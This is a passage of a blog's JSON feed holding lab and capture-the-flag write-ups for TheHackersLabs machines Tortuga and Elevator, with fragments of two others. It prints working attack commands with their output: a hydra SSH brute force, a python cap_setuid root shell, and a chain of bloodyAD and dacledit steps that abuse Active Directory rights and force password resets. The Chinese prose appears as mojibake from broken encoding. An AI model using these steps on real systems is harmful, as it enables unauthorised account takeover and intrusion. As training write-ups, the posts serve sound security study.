            "summary": "Season8 Certificate https://app.hackthebox.com/machines/Certificate | Windows | Hard å‰æœŸè¸©ç‚¹ åˆšåˆšå°è¯•äº†SMBæ— æ³•ä½¿ç”¨åŒ¿åè´¦æˆ·è¿›è¡Œè®¿é—®ï¼Œå› ä¸ºè¿˜æ‰«æåˆ°äº†80ç«¯å£ï¼Œæ‰€ä»¥ä»Webä¸‹æ‰‹ Web è®¿é—® HTTP å¹¶é‡‡é›†æŒ‡çº¹ ...",
            "date_modified": "2025-06-02T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackTheBox",
                "Windows",
                "ADCS",
                "GoldenCertificate",
                "seManageVolumePrivilegem",
                "ZipSlip"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/10/01/TheHackersLabsTortuga",
            "content_html": "\n# Tortuga\n\n> https://labs.thehackerslabs.com/machine/131\n> \n\n![image.png](/post-images/TheHackersLabsTortuga/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  Tortuga nmap -sT -min-rate 10000 -p- 192.168.56.120\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 16:50 CST\nNmap scan report for 192.168.56.120\nHost is up (0.00076s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:FE:83:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.92 seconds\n```\n\n```bash\nâœ  Tortuga nmap -sT -A -p 22,80 192.168.56.120                                            \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 16:51 CST\nNmap scan report for 192.168.56.120\nHost is up (0.00040s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)\n| ssh-hostkey: \n|   256 bd:bc:74:bc:a6:ab:09:29:2d:88:42:16:91:93:b1:a4 (ECDSA)\n|_  256 3b:99:fe:7e:ab:ae:b3:a7:05:b2:d1:73:08:6e:e7:a9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Isla Tortuga\nMAC Address: 08:00:27:FE:83:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.40 ms 192.168.56.120\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.53 seconds\n```\n\n### æšä¸¾\n\nHTTP\n\n![image.png](/post-images/TheHackersLabsTortuga/image1.png)\n\né¡µé¢ä¸­çš„ä¸¤ä¸ªé“¾æ¥\n\n```bash\nLa TripulaciÃ³n de Tortuga æµ·é¾Ÿèˆ¹å‘˜\n\n    CapitÃ¡n Barbanegra â€“ Estratega implacable. é»‘èƒ¡å­èˆ¹é•¿ â€“ æ— æƒ…çš„æˆ˜ç•¥å®¶ã€‚\n    Corsario Rojo â€“ Maestro de la espada.\n    çº¢è‰²æµ·ç›—èˆ¹ â€“ å‰‘ä¹‹å¤§å¸ˆã€‚\n    Grumete Verde â€“ Aprendiz despistado. ç»¿è‰²å°å±‹ç”·å­© â€“ å¿ƒä¸åœ¨ç„‰çš„å­¦å¾’ã€‚\n    TimÃ³n de Hierro â€“ El que nunca pierde el rumbo.\n    é“èˆµâ€”â€”æ°¸ä¸è¿·è·¯çš„äººã€‚\n\n\"Quien domine el timÃ³n hallarÃ¡ el rumbo a la victoria...\"\nâ€œè°ä¸»å®°èˆµï¼Œè°å°±ä¼šæ‰¾åˆ°èƒœåˆ©ä¹‹è·¯......â€\n\n\"Recuerda: el viejo truco de las rutas dobles siempre funciona...\"\nâ€œè®°ä½ï¼šåŒè·¯çº¿çš„è€æŠŠæˆæ€»æ˜¯æœ‰æ•ˆçš„......â€\n```\n\n```bash\nMapa de Isla Tortuga æ‰˜å°”å›¾åŠ å²›åœ°å›¾\n\n~~~~~~~~~~~~~~~~~~~\n~     PIRATE BAY   ~\n~~~~~~~~~~~~~~~~~~~\n       |   |\n       |   |    X  (tesoro enterrado)\n       |   |\n~~~~~~~~~~~~~~~~~~~\n~     PUERTO       ~\n~~~~~~~~~~~~~~~~~~~\n    \n\nUna nota arrugada se lee en la esquina del mapa...\nåœ°å›¾çš„è§’è½é‡Œå†™ç€ä¸€å¼ çš±å·´å·´çš„çº¸æ¡......\n\n\"Ey grumete revisa la nota oculta que dejado en tu camarote...\"\nâ€œå˜¿ï¼Œèˆ¹èˆ±ç”·å­©ï¼Œæ£€æŸ¥ä¸€ä¸‹æˆ‘ç•™åœ¨ä½ èˆ¹èˆ±é‡Œçš„éšè—çº¸æ¡......â€\n```\n\nâ€œ`grumete` æ£€æŸ¥èˆ¹èˆ±é‡Œçš„éšè—çº¸æ¡â€œ æ„Ÿè§‰æ˜¯ä¸€ä¸ªç›®å½•æˆ–è€…ç”¨æˆ·\n\nç›®å½•æ‰«ææ— ç»“æœ\n\n```bash\nâœ  Tortuga gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://192.168.56.120/grumete\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.120/grumete\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\nProgress: 661680 / 661683 (100.00%)\n===============================================================\nFinished\n===============================================================\n```\n\nè¿›è¡Œ `ssh` çˆ†ç ´\n\n```bash\nâœ  Tortuga hydra -l grumete -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.120 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-01 17:10:39\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task\n[DATA] attacking ssh://192.168.56.120:22/\n[STATUS] 121.00 tries/min, 121 tries in 00:01h, 14344278 to do in 1975:48h, 8 active\n[STATUS] 120.00 tries/min, 360 tries in 00:03h, 14344039 to do in 1992:14h, 8 active\n[STATUS] 121.29 tries/min, 849 tries in 00:07h, 14343550 to do in 1971:03h, 8 active\n[22][ssh] host: 192.168.56.120   login: grumete   password: 1234\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-01 17:19:48\n```\n\nå¾—åˆ°å¯†ç  `1234`\n\nè¿›å»åèƒ½è¯»å– user.txt\n\n```bash\ngrumete@TheHackersLabs-Tortuga:~$ cat user.txt \nc3fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## æƒé™æå‡\n\n### ä¿¡æ¯æ”¶é›†\n\nå®¶ç›®å½•ä¸‹ `.nota.txt` å¾—åˆ°ä¸€ä¸ªå¯†ç  `mar_de_fuego123`\n\n```\ngrumete@TheHackersLabs-Tortuga:~$ cat .nota.txt\nQuerido grumete,\n\nParto rumbo a la isla vecina por asuntos que no pueden esperar, estarÃ© fuera un par de dÃ­as.\nMientras tanto, confÃ­o en ti para que cuides del barco y de la tripulaciÃ³n como si fueran mÃ­os.\n\nLa puerta de la cÃ¡mara del timÃ³n estÃ¡ asegurada con la contraseÃ±a:\n    \"mar_de_fuego123\"\n\nRecuerda, no se la reveles a nadie mÃ¡s. Has demostrado ser leal y firme durante todos estos aÃ±os\nnavegando juntos, y eres en quien mÃ¡s confÃ­o en estos mares traicioneros.\n\nMantÃ©n la guardia alta, vigila las provisiones y cuida de que ningÃºn intruso ponga un pie en cubierta.\nCuando regrese, espero encontrar el barco tal y como lo dejo hoy (Â¡y nada de usar la bodega de ron\npara hacer carreras de tortugas otra vez!).\n\nCon la confianza de siempre,\nâ€” El CapitÃ¡n\n```\n\næ˜¯ç”¨æˆ· capitan çš„å¯†ç \n\n![image.png](/post-images/TheHackersLabsTortuga/image2.png)\n\nä¸Šä¼  `linepas` æ‰«ä¸€æ³¢ï¼Œå‘ç° python è®¾ç½®äº†ç‰¹æ®Šæƒé™\n\n![image.png](/post-images/TheHackersLabsTortuga/image3.png)\n\n- **`setcap`**: è¿™æ˜¯ç”¨æ¥è®¾ç½®æ–‡ä»¶ Capabilities çš„å‘½ä»¤ã€‚\n- **`cap_setuid`**: è¿™æ˜¯è¦æˆäºˆçš„å…·ä½“èƒ½åŠ›ã€‚`CAP_SETUID`Â å…è®¸ä¸€ä¸ªè¿›ç¨‹æ”¹å˜å…¶ UIDï¼ˆç”¨æˆ·IDï¼‰ã€‚è¿™æ˜¯ SUID (Set User ID) æƒé™çš„æ ¸å¿ƒèƒ½åŠ›ã€‚æ‹¥æœ‰è¿™ä¸ªèƒ½åŠ›çš„è¿›ç¨‹å¯ä»¥è°ƒç”¨Â `setuid(0)`Â æ¥å°†è‡ªå·±å˜æˆ root ç”¨æˆ·ã€‚\n- **`=ep`**: è¿™æŒ‡å®šäº†è¦å°†Â `cap_setuid`Â æ·»åŠ åˆ°å“ªäº› Capability é›†åˆä¸­ã€‚\n    - **`e`Â (Effective)**: æœ‰æ•ˆé›†åˆã€‚è¡¨ç¤ºå½“ç¨‹åºè¿è¡Œæ—¶ï¼Œè¿™ä¸ªèƒ½åŠ›**ç«‹å³ç”Ÿæ•ˆ**ã€‚è¿™æ˜¯ææƒçš„å…³é”®ã€‚\n    - **`p`Â (Permitted)**: è®¸å¯é›†åˆã€‚è¡¨ç¤ºç¨‹åºè¢«**å…è®¸**æ‹¥æœ‰è¿™ä¸ªèƒ½åŠ›ï¼Œå³ä½¿å®ƒæš‚æ—¶æ²¡æœ‰ä½¿ç”¨ã€‚\n- **`/usr/bin/python3.11`**: è¿™æ˜¯è¢«èµ‹äºˆèƒ½åŠ›çš„ç›®æ ‡æ–‡ä»¶ï¼Œå³ Python 3.11 çš„å¯æ‰§è¡Œç¨‹åºã€‚\n\n```bash\ncapitan@TheHackersLabs-Tortuga:/tmp$ /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\nroot@TheHackersLabs-Tortuga:/tmp# \n```\n\nè¯»å– root.txt\n\n```bash\nroot@TheHackersLabs-Tortuga:/root# cat root.txt \nc3fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```",
            "url": "https://www.sunsetaction.top/2025/10/01/TheHackersLabsTortuga",
            "title": "TheHackersLabs - Tortuga",
            "summary": "Tortuga https://labs.thehackerslabs.com/machine/131 Recon PortScan æšä¸¾ HTTP é¡µé¢ä¸­çš„ä¸¤ä¸ªé“¾æ¥ â€œgrumete æ£€æŸ¥èˆ¹èˆ±é‡Œçš„éšè—çº¸æ¡â€œ æ„Ÿè§‰æ˜¯ä¸€ä¸ªç›®å½•æˆ–è€…ç”¨æˆ· ç›®å½•æ‰«ææ— ç»“æœ è¿›è¡Œ ssh çˆ†ç ´ å¾—åˆ°å¯†ç  1234 è¿›å»åèƒ½è¯»...",
            "date_modified": "2025-10-01T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Linux",
                "Brute",
                "Cappbilities"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/29/TheHackersLabsElevator",
            "content_html": "\n# Elevator\n\n> https://labs.thehackerslabs.com/machine/126\n> \n\n![image.png](/post-images/TheHackersLabsElevator/image.png)\n\nä½œè€…ç»™äº†ä¸€ä¸ªè´¦æˆ·\n\n```bash\nUser john.smith\nPassword Rk436\\#Z4&\n```\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  ~ nmap -sP 10.0.250.0/24                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:20 CST\nNmap scan report for 10.0.250.1\nHost is up (0.00072s latency).\nMAC Address: 08:00:27:8F:2A:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 10.0.250.3\nHost is up (0.00057s latency).\nMAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 10.0.250.4\nHost is up.\nNmap done: 256 IP addresses (3 hosts up) scanned in 28.12 seconds\n```\n\n```bash\nâœ  ~ nmap -sT -min-rate 10000 -p- 10.0.250.3    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:21 CST\nStrange read error from 10.0.250.3 (104 - 'Connection reset by peer')\nNmap scan report for 10.0.250.3\nHost is up (0.00098s latency).\nNot shown: 65513 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n49668/tcp open  unknown\n49674/tcp open  unknown\n49676/tcp open  unknown\n49680/tcp open  unknown\n49687/tcp open  unknown\n49692/tcp open  unknown\n49711/tcp open  unknown\nMAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n```bash\nâœ  ~ nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 10.0.250.3     \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:24 CST\nNmap scan report for 10.0.250.3\nHost is up (0.00070s latency).\n\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-29 06:24:32Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bloodhound.thl, Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: bloodhound.thl, Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp open  mc-nmf        .NET Message Framing\nMAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|2016|11|10 (95%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Microsoft Windows Server 2022 (95%), Microsoft Windows Server 2016 (91%), Microsoft Windows 11 21H2 (90%), Microsoft Windows 10 (86%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: Host: ELEVATOR; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: -38s\n| smb2-time: \n|   date: 2025-09-29T06:24:37\n|_  start_date: N/A\n|_nbstat: NetBIOS name: ELEVATOR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:f5:3d:b0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.70 ms 10.0.250.3\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 64.85 seconds\n```\n\n### æšä¸¾\n\nSMB æšä¸¾ï¼Œä¸‹è½½äº†ä¸€äº›æ–‡ä»¶ï¼Œä¸è¿‡éƒ½æ˜¯æ²¡ä»€ä¹ˆç”¨çš„\n\n![image.png](/post-images/TheHackersLabsElevator/image1.png)\n\næŸ¥çœ‹ä¸€ä¸‹ç”¨æˆ·æƒé™\n\n```bash\nâœ  Elevator nxc ldap 10.0.250.3 -u 'john.smith' -p 'Rk436\\#Z4&'\nLDAP        10.0.250.3      389    ELEVATOR         [*] Windows Server 2022 Build 20348 (name:ELEVATOR) (domain:bloodhound.thl)\nLDAP        10.0.250.3      389    ELEVATOR         [+] bloodhound.thl\\john.smith:Rk436\\#Z4&\n\nâœ  Elevator nxc winrm 10.0.250.3 -u 'john.smith' -p 'Rk436\\#Z4&'\nWINRM       10.0.250.3      5985   ELEVATOR         [*] Windows Server 2022 Build 20348 (name:ELEVATOR) (domain:bloodhound.thl)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       10.0.250.3      5985   ELEVATOR         [-] bloodhound.thl\\john.smith:Rk436\\#Z4& \n```\n\nä¸Š `bloodhound`\n\n```bash\nâœ  Elevator bloodhound-python -d bloodhound.thl -u 'john.smith' -p 'Rk436\\#Z4&' -c all --zip -dc bloodhound.thl -ns 10.0.250.3\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: bloodhound.thl\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: bloodhound.thl\nWARNING: Kerberos auth to LDAP failed, trying NTLM\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: bloodhound.thl\nWARNING: Kerberos auth to LDAP failed, trying NTLM\nINFO: Found 9 users\nINFO: Found 57 groups\nINFO: Found 2 gpos\nINFO: Found 4 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: elevator.bloodhound.thl\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250929144249_bloodhound.zip\n```\n\n## æ¨ªå‘ç§»åŠ¨\n\n### ADDSelf\n\nå…è®¸ `john.smith` å°†è‡ªå·±æ·»åŠ åˆ° `Finanzas` ç»„ä¸­\n\n![image.png](/post-images/TheHackersLabsElevator/image2.png)\n\n```bash\nâœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'john.smith' -p 'Rk436\\#Z4&' add groupMember FINANZAS john.smith\n[+] john.smith added to FINANZAS\n```\n\n### Force Change Password\n\nç„¶å `FINANZAS` ç»„é˜Ÿ `MARY.JOHNSON` ç”¨æˆ·æœ‰ `GenericAll` æƒé™\n\n![image.png](/post-images/TheHackersLabsElevator/image3.png)\n\nç›´æ¥ä¿®æ”¹å…¶å¯†ç \n\n```bash\nâœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'john.smith' -p 'Rk436\\#Z4&' set password mary.johnson admin12345\n[+] Password changed successfully!\n```\n\næ¥ç€ `MARY.JOHNSON` åˆå¯ä»¥ä¿®æ”¹ `ROBERT.WILLIAMS` çš„å¯†ç \n\n![image.png](/post-images/TheHackersLabsElevator/image4.png)\n\n```bash\n\tâœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'mary.johnson' -p 'admin12345' set password ROBERT.WILLIAMS admin12345\n[+] Password changed successfully!\n```\n\n### WriteDACL æ»¥ç”¨\n\n`ROBERT.WILLIAMS` æ‹¥æœ‰å¯¹ `PATRICIA.BROWN` çš„ `WriteDacl` æƒé™\n\n![image.png](/post-images/TheHackersLabsElevator/image5.png)\n\n```bash\nâœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'ROBERT.WILLIAMS' -p 'admin12345' get writable\n\ndistinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=bloodhound,DC=thl\npermission: WRITE\n\ndistinguishedName: CN=Robert Williams,OU=marketing,DC=bloodhound,DC=thl\npermission: WRITE\n\ndistinguishedName: CN=Patricia Brown,CN=Users,DC=bloodhound,DC=thl\nDACL: WRITE\n```\n\nè¦å°† WriteDacl æ»¥ç”¨åˆ°ç”¨æˆ·å¯¹è±¡ï¼Œæ‚¨å¯ä»¥æˆäºˆè‡ªå·± GenericAll æƒé™\n\n```bash\nâœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'ROBERT.WILLIAMS' -p 'admin12345' add genericAll PATRICIA.BROWN ROBERT.WILLIAMS\n[+] ROBERT.WILLIAMS has now GenericAll on PATRICIA.BROWN\n```\n\nå†å¼ºåˆ¶ä¿®æ”¹å…¶å¯†ç \n\n```bash\nâœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'ROBERT.WILLIAMS' -p 'admin12345' set password PATRICIA.BROWN admin12345\n[+] Password changed successfully!\n```\n\n### ADDSelf - 2\n\nç”¨æˆ· `PATRICIA.BROWN@BLOODHOUND.THL` æœ‰æƒä¿®æ”¹ç»„ `OPERACIONES@BLOODHOUND.THL` çš„æ‰€æœ‰è€…\n\n![image.png](/post-images/TheHackersLabsElevator/image6.png)\n\né‚£ä¹ˆå°±å°†å…¶çš„æ‰€æœ‰è€…ä¿®æ”¹ä¸ºè‡ªå·±ï¼Œç„¶åå†å°†è‡ªå·±æ·»åŠ è¿›å»\n\n```bash\nâœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'PATRICIA.BROWN' -p 'admin12345' set owner OPERACIONES PATRICIA.BROWN\n[+] Old owner S-1-5-21-3580157585-956322742-780763674-512 is now replaced by PATRICIA.BROWN on OPERACIONES\n```\n\n```bash\nâœ  Elevator dacledit.py -action 'write' -rights 'WriteMembers' -principal 'PATRICIA.BROWN' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=BLOODHOUND,DC=THL' 'bloodhound.thl'/'PATRICIA.BROWN':'admin12345'\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] DACL backed up to dacledit-20250929-155416.bak\n[*] DACL modified successfully!\n```\n\n```bash\nâœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'PATRICIA.BROWN' -p 'admin12345' add groupMember OPERACIONES PATRICIA.BROWN\n[+] PATRICIA.BROWN added to OPERACIONES\n```\n\nåˆ°è¿™é‡Œå¡ä½äº†ï¼Œå› ä¸ºæ²¡æœ‰ä»»ä½•è·¯å¾„ï¼ŒSMB ä¹Ÿæšä¸¾è¿‡äº†ï¼Œæ•…æŸ¥çœ‹ WPï¼Œå‘ç° `OPERACIONES` åº”è¯¥å¯¹ Jones æœ‰ `genericAll` æƒé™çš„ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œæ²¡æœ‰ï¼Œè¯¢é—®äº†ä½¬ä»¬å¾—çŸ¥æ˜¯éœ€è¦é‡æ–°å¯¼å…¥\n\n### Force Change Password - 2\n\né‡æ–°å¯¼å…¥åï¼Œå¯ä»¥çœ‹åˆ°å¯¹ `Jones` æœ‰æƒé™äº†\n\n![image.png](/post-images/TheHackersLabsElevator/image7.png)\n\næ‰€ä»¥æ˜¯ä¸€æ¡è·¯å¾„ä¸‹æ¥çš„\n\n![image.png](/post-images/TheHackersLabsElevator/image8.png)\n\nå¼ºåˆ¶ä¿®æ”¹å¯†ç \n\n```bash\nâœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'PATRICIA.BROWN' -p 'admin12345' set password MICHAEL.JONES admin12345\n[+] Password changed successfully!\n```\n\nç»™è‡ªå·± `jones` æ·»åŠ åˆ°è¿œç¨‹ç»„é‡Œ\n\n```bash\nâœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'MICHAEL.JONES' -p 'admin12345' add groupMember 'Usuarios de administraciÃ³n remota' MICHAEL.JONES\n[+] MICHAEL.JONES added to Usuarios de administraciÃ³n remota\n```\n\nä½¿ç”¨ `evil-winrm` è¿›è¡Œç™»å½•\n\n![image.png](/post-images/TheHackersLabsElevator/image9.png)\n\n```bash\n*Evil-WinRM* PS C:\\Users\\administrador\\desktop> type root.txt\naxxxxxxxxxxxxxxxxxxxxxxxxxxx6\n*Evil-WinRM* PS C:\\Users\\administrador\\desktop> type user.txt\nbxxxxxxxxxxxxxxxxxxxxxxxxxxxe\n```\n\n## æ€»ç»“\n\nçˆ½ï¼Ÿ",
            "url": "https://www.sunsetaction.top/2025/09/29/TheHackersLabsElevator",
            "title": "TheHackersLabs - Elevator",
            "summary": "Elevator https://labs.thehackerslabs.com/machine/126 ä½œè€…ç»™äº†ä¸€ä¸ªè´¦æˆ· Recon PortScan æšä¸¾ SMB æšä¸¾ï¼Œä¸‹è½½äº†ä¸€äº›æ–‡ä»¶ï¼Œä¸è¿‡éƒ½æ˜¯æ²¡ä»€ä¹ˆç”¨çš„ æŸ¥çœ‹ä¸€ä¸‹ç”¨æˆ·æƒé™ ä¸Š bloodhound æ¨ªå‘ç§»åŠ¨ ADDSelf å…è®¸ john.sm...",
            "date_modified": "2025-09-29T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Windows",
                "AD"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/28/TheHackersLabsPa Que Aiga Lujo",
            "content_html": "\n# Pa Que Aiga Lujo\n\n> https://labs.thehackerslabs.com/machine/125\n> \n\n![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  PaQueAigaLujo nmap -sP 192.168.56.0/24  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 23:36 CST\nNmap scan report for 192.168.56.1\nHost is up (0.00053s latency).\nMAC Address: 0A:00:27:00:00:08 (Unknown)\nNmap scan report for 192.168.56.2\nHost is up (0.00041s latency).\nMAC Address: 08:00:27:E9:F5:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.118\nHost is up (0.00047s latency).\nMAC Address: 08:00:27:33:D8:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n```bash\nâœ  PaQueAigaLujo nmap -sT -min-rate 10000 -p- 192.168.56.118  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 23:37 CST\nNmap scan report for 192.168.56.118\nHost is up (0.0017s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:33:D8:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 17.23 seconds\n```\n\n```bash\nâœ  PaQueAigaLujo nmap -sT -A -p 22,80 192.168.56.118                                                 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 23:37 CST\nNmap scan report for 192.168.56.118\nHost is up (0.00061s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)\n| ssh-hostkey: \n|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)\n|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: LuxeCollection - Art\\xC3\\xADculos de Lujo Exclusivos\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:33:D8:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.61 ms 192.168.56.118\n\nOS and 